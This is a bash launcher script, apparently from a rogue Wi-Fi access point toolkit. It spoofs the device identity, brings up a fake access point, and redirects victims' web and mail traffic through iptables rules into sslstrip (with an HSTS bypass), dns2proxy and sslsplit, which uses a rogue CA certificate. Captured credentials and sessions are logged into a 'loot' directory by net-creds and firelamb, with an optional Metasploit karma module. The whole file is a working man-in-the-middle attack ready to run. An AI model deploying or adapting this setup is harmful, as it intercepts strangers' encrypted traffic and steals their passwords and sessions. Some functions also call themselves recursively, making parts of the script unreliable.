#!/bin/bash

upstream=eth0
phy=wlan0

etc=/etc/mana-toolkit
lib=/usr/lib/mana-toolkit
share=/usr/share/mana-toolkit
loot=/var/lib/mana-toolkit

conf=$etc/hostapd-mana.conf
hostapd=$lib/hostapd

function hostname() {
	hostname WRT54G
	echo hostname WRT54G
	sleep 2
}

function clearwifi() {
	service network-manager stop
	rfkill unblock wlan
}

function macchanger() {
        ifconfig "$phy" down
        macchanger -r "$phy"
        ifconfig "$phy" up
}

function start_hostapd() {
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
}

function start_dnsmasq() {
	dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo -p 0
}

function nat_firewall() {
        echo '1' > /proc/sys/net/ipv4/ip_forward
        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -F
        iptables -t nat -F
        iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
        iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
        iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
        #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
}

function sslstrip() {
        #SSLStrip with HSTS bypass
        cd $share/sslstrip-hsts/sslstrip2/
        python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
        iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        cd $share/sslstrip-hsts/dns2proxy/
        python dns2proxy.py -i $phy&
        cd -
}

function sslsplit() {
        #SSLSplit
        sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
         https 0.0.0.0 10443 \
         http 0.0.0.0 10080 \
         ssl 0.0.0.0 10993 \
         tcp 0.0.0.0 10143 \
         ssl 0.0.0.0 10995 \
         tcp 0.0.0.0 10110 \
         ssl 0.0.0.0 10465 \
         tcp 0.0.0.0 10025&
        #iptables -t nat -A INPUT -i $phy \
         #-p tcp --destination-port 80 \
         #-j REDIRECT --to-port 10080
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 443 \
         -j REDIRECT --to-port 10443
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 143 \
         -j REDIRECT --to-port 10143
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 993 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 65493 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 465 \
         -j REDIRECT --to-port 10465
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 25 \
         -j REDIRECT --to-port 10025
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 995 \
         -j REDIRECT --to-port 10995
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 110 \
         -j REDIRECT --to-port 10110
}

function firelamb() {
        # Start FireLamb
        $share/firelamb/firelamb.py -i $phy &
}

function netcreds() {
        # Start net-creds
        python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
}

function metasploit() {
        sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
        msfconsole -r $etc/karmetasploit.rc&
}

function hangon() {
        echo "Hit enter to kill me"
        read
}

function killem() {
        service apache2 stop

        pkill dhcpd
        pkill dnsmasq
        pkill dnsspoof
        pkill dns2proxy
        pkill hostapd
        pkill msfconsole
        pkill python
        pkill ruby
        pkill stunnel4
        pkill sslstrip
        pkill sslsplit
        pkill tinyproxy

        rm $EXNODE
        rm /tmp/crackapd.run

        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -t nat -F
}

hostname
clearwifi
macchanger
start_hostapd
start_dnsmasq
nat_firewall
sslstrip
sslsplit
firelamb
netcreds
#metasploit

hangon 	#Wait for Enter
 killem	#Kill all shit
